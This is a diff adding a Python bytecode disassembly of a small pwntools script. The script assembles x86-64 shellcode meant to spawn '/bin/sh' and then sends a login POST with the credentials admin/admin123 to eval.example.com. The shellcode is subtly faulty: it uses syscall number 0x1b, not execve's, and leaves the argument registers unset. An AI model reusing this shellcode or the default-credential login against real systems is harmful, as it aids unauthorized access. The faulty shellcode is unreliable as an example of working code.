@@ -1,0 +1,78 @@
+  0           0 RESUME                   0
+
+  1           2 LOAD_CONST               0 (0)
+              4 LOAD_CONST               1 (('*',))
+              6 IMPORT_NAME              0 (pwn)
+              8 IMPORT_STAR
+
+  2          10 PUSH_NULL
+             12 LOAD_NAME                1 (context)
+             14 LOAD_CONST               2 ('linux')
+             16 LOAD_CONST               3 ('amd64')
+             18 LOAD_CONST               4 ('debug')
+             20 KW_NAMES                 5
+             22 PRECALL                  3
+             26 CALL                     3
+             36 POP_TOP
+
+  4          38 LOAD_CONST               6 ('\n    mov rax, 0x68732f6e69622f\n    push rax\n    mov rdi, rsp\n    mov rax, 0x1b\n    syscall\n')
+             40 STORE_NAME               2 (shellcode)
+
+ 11          42 PUSH_NULL
+             44 LOAD_NAME                3 (print)
+             46 PUSH_NULL
+             48 LOAD_NAME                4 (asm)
+             50 LOAD_NAME                2 (shellcode)
+             52 PRECALL                  1
+             56 CALL                     1
+             66 PRECALL                  1
+             70 CALL                     1
+             80 POP_TOP
+
+ 13          82 LOAD_CONST               0 (0)
+             84 LOAD_CONST               7 (None)
+             86 IMPORT_NAME              5 (requests)
+             88 STORE_NAME               5 (requests)
+
+ 15          90 LOAD_CONST               8 ('https://eval.example.com')
+             92 STORE_NAME               6 (url)
+
+ 17          94 LOAD_CONST               9 ('admin')
+
+ 18          96 LOAD_CONST              10 ('admin123')
+
+ 19          98 LOAD_CONST              11 ('1')
+
+ 16         100 LOAD_CONST              12 (('user', 'password', 'type'))
+            102 BUILD_CONST_KEY_MAP      3
+            104 STORE_NAME               7 (data)
+
+ 21         106 PUSH_NULL
+            108 LOAD_NAME                5 (requests)
+            110 LOAD_ATTR                8 (Session)
+            120 PRECALL                  0
+            124 CALL                     0
+            134 STORE_NAME               9 (s)
+
+ 22         136 LOAD_NAME                9 (s)
+            138 LOAD_METHOD             10 (post)
+            160 LOAD_NAME                6 (url)
+            162 LOAD_NAME                7 (data)
+            164 KW_NAMES                13
+            166 PRECALL                  2
+            170 CALL                     2
+            180 STORE_NAME              11 (r)
+
+ 23         182 PUSH_NULL
+            184 LOAD_NAME                3 (print)
+            186 LOAD_NAME               11 (r)
+            188 LOAD_ATTR               12 (content)
+            198 LOAD_METHOD             13 (decode)
+            220 LOAD_CONST              14 ('utf-8')
+            222 PRECALL                  1
+            226 CALL                     1
+            236 PRECALL                  1
+            240 CALL                     1
+            250 POP_TOP
+            252 LOAD_CONST               7 (None)
+            254 RETURN_VALUE
